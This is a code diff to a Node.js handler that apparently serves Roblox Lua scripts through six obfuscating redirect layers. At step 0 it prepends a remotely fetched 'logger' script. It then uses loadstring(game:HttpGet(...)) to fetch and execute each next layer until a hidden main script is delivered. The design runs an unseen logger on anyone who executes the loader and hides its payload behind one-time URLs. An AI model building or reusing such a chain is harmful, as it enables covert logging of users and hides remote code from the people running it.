@@ -97,7 +97,7 @@ module.exports = async function(req, res) {
     const currentPath = urlParts[0];
     
     try {
-        // ========== STEP 0: LOGGER DI COROUTINE, LOADSTRING DI DALAM ==========
+        // ========== STEP 0: LOGGER + REDIRECT KE LAYER 1 ==========
         if (currentStep === 0) {
             let sequence = [];
             while (sequence.length < SETTINGS.TOTAL_LAYERS) {
@@ -110,12 +110,9 @@ module.exports = async function(req, res) {
             const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
 
-            // loadstring ada di DALAM coroutine setelah logger selesai
-            const luaScript = "coroutine.wrap(function()\n" +
-                              (loggerScript || '') + "\n" +
+            const luaScript = (loggerScript || '') + "\n" +
                               "task.wait(" + (waitTime / 1000) + ")\n" +
-                              "loadstring(game:HttpGet(\"" + nextUrl + "\"))()\n" +
-                              "end)()";
+                              "loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
 
@@ -157,14 +154,13 @@ module.exports = async function(req, res) {
         session.used = true;
 
         /*
-         * TOTAL_LAYERS = 6, mapping idx:
-         * step 0  → logger (coroutine) + redirect ke layer 1 (idx 0)
-         * idx 0   → layer 1 → redirect biasa
-         * idx 1   → layer 2 → redirect biasa
-         * idx 2   → layer 3 → redirect biasa
-         * idx 3   → layer 4 → redirect biasa
-         * idx 4   → layer 5 → redirect biasa
-         * idx 5   → layer 6 → MAIN SCRIPT SAJA ✅
+         * step 0  → logger + redirect ke layer 1
+         * idx 0   → layer 1 → redirect
+         * idx 1   → layer 2 → redirect
+         * idx 2   → layer 3 → redirect
+         * idx 3   → layer 4 → redirect
+         * idx 4   → layer 5 → redirect
+         * idx 5   → layer 6 → MAIN SCRIPT ✅
          */
 
         // ========== LAYER 6 (idx 5): MAIN SCRIPT SAJA ==========
@@ -174,7 +170,7 @@ module.exports = async function(req, res) {
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 1-5 (idx 0,1,2,3,4): REDIRECT BIASA ==========
+        // ========== LAYER 1-5 (idx 0-4): REDIRECT BIASA ==========
         const nextIndex = idx + 1;
         const nextStepNumber = session.stepSequence[nextIndex];
         const { newSessionID, nextKey, waitTime } = makeSession(
